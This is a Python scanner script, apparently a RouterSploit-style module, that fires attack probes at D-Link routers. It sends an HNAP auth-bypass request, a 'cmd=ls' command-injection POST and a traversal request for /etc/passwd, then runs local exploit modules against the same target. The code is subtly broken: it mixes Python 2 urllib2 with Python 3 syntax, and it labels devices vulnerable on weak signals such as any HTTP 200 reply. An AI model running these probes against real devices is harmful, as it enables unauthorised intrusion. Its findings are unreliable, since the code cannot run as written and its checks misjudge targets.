target = ""
# rsf exploit module
# rsf scanner module
# descriptiom: scans D-link for vulnerabilities 
import time
import urllib2
from os import listdir
from os.path import isfile, join
import imp


class Exploit(object):
    """
    D-Link Scanner
    """
    __info__ = {
        'name': 'D-Link Scanner',
        'description': 'Scanner module for D-Link devices',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',
        ],
        'references': (
            '',
        ),
        'devices': (
            'Multi',
        )
    }

    target = ''
    port = 80

    def run(self):
        print("[*] Waiting 2 seconds for modules to load...")
        time.sleep(2)

        url_base = "http://{}:{}/".format(self.target, self.port)
        vulns = []

        # --- Built-in CVE checks ---

        # CVE-2015-2051 - HNAP Auth Bypass
        try:
            req = urllib2.Request(url_base + "HNAP1/")
            req.add_header("SOAPAction", '"http://purenetworks.com/HNAP1/GetDeviceSettings"')
            res = urllib2.urlopen(req, timeout=5)
            body = res.read()
            if "Unauthorized" not in body:
                print("[+] CVE-2015-2051 HNAP Auth Bypass: vulnerable")
                vulns.append("CVE-2015-2051")
            else:
                print("[-] CVE-2015-2051 HNAP Auth Bypass: not vulnerable")
        except Exception:
            print("[*] CVE-2015-2051 check failed")

        # CVE-2019-16920 - Remote Command Execution
        try:
            test_url = url_base + "command.php"
            req = urllib2.Request(test_url, data="cmd=ls")
            res = urllib2.urlopen(req, timeout=5)
            if res.code == 200:
                print("[+] CVE-2019-16920 Command Execution: vulnerable")
                vulns.append("CVE-2019-16920")
            else:
                print("[-] CVE-2019-16920 Command Execution: not vulnerable")
        except Exception:
            print("[*] CVE-2019-16920 check failed")

        # CVE-2013-6027 - Directory Traversal
        try:
            traversal_url = url_base + "cgi-bin/webproc?getpage=/etc/passwd"
            res = urllib2.urlopen(traversal_url, timeout=5)
            body = res.read()
            if "root:" in body:
                print("[+] CVE-2013-6027 Directory Traversal: vulnerable")
                vulns.append("CVE-2013-6027")
            else:
                print("[-] CVE-2013-6027 Directory Traversal: not vulnerable")
        except Exception:
            print("[*] CVE-2013-6027 check failed")

        # --- External Module Scans ---
        rootpath = '/rsf663/modules/'

        modules = [
            f.replace(".py", "")
            for f in listdir(rootpath)
            if isfile(join(rootpath, f)) and f.endswith(".py") and f != "__init__.py" and "dlink" in f.lower()
        ]

        for module_name in modules:
            module_path = join(rootpath, module_name + '.py')

            try:
                module = imp.load_source('module', module_path)
                exploit = module.Exploit()

                exploit.target = self.target
                exploit.port = self.port

                res = exploit.check()

                if res is True:
                    print("[+] {} is vulnerable".format(module_name))
                    vulns.append(module_name)
                elif res is False:
                    print("[-] {} is not vulnerable".format(module_name))
                else:
                    print("[*] {} could not be verified".format(module_name))
            except Exception as e:
                print("[-] Error loading module {}: {}".format(module_name, e))

        print("")
        if len(vulns):
            print("[+] Device is vulnerable!")
            for v in vulns:
                print(" - {}".format(v))
        else:
            print("[-] Device is not vulnerable to any exploits!")
        print("")

    def check(self):
        raise NotImplementedError("Check method is not available")




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
